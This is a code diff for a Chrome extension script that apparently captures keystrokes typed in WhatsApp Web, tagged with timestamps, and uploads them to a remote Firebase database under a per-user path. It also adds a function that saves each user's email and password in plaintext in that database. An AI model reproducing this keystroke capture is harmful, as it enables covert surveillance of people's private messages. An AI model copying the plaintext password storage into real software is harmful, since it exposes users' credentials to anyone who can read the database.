@@ -14,16 +14,13 @@ const config = {
   };
 
 const FIREBASEANONA = firebase.initializeApp(config);
+var isSignedIn = false;
+var databaseKey = "a";
 
-function writeClientData(key, time) {
-    FIREBASEANONA.database().ref().set({
-        keyCode: key,
-        timeStamp: time
-    })
-}
-
-function checkUserExistance(userName) {
-    
+function writeClientData(key, time, databaseKey) {
+    FIREBASEANONA.database().ref("users/" + databaseKey + "/keys").update({
+        [time]: key
+    });
 }
 
 function onSignIn(request){
@@ -31,27 +28,42 @@ function onSignIn(request){
 }
 
 function onSignUp(request){
-	firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
+    firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
+}
+
+function updateDatabase(request){
+    var email = request.email, password = request.password,
+        key = email.substr(0, email.indexOf('@'));
+    // Set database Users/[username] without @-- with password.
+    FIREBASEANONA.database().ref('users/' + key).set({
+        email: email,
+        password: password,
+        keys: {}
+    });
+    
+    alert("key = " + key);
+    return key;
 }
 
 function onMessage(request, sender){
-	if(sender.url == WHATSAPP_WEB && isSignedIn){
-		console.log(request.key + "- " + request.time);
-		writeClientData(request.key, request.time);
-	}
-	else{
-		if(request.action == SIGN_IN_ACTION){
-		    isSignedIn = true;
+    if(!isSignedIn){
+        if(request.action == SIGN_IN_ACTION){
+            isSignedIn = true;
 			onSignIn(request);
+            databaseKey = updateDatabase(request);
 		}
 		if(request.action == SIGN_UP_ACTION){
-		    isSignedIn = true;
+            isSignedIn = true;
 			onSignUp(request)
+            databaseKey = updateDatabase(request);
 		}
-		
-	}
+    }
+	else {
+        if(sender.url == WHATSAPP_WEB && isSignedIn){
+            console.log(request.key + "- " + request.time);
+            writeClientData(request.key, request.time, databaseKey);
+        }
+    }
 }
-
-var isSignedIn = false
 
 chrome.runtime.onMessage.addListener(onMessage);
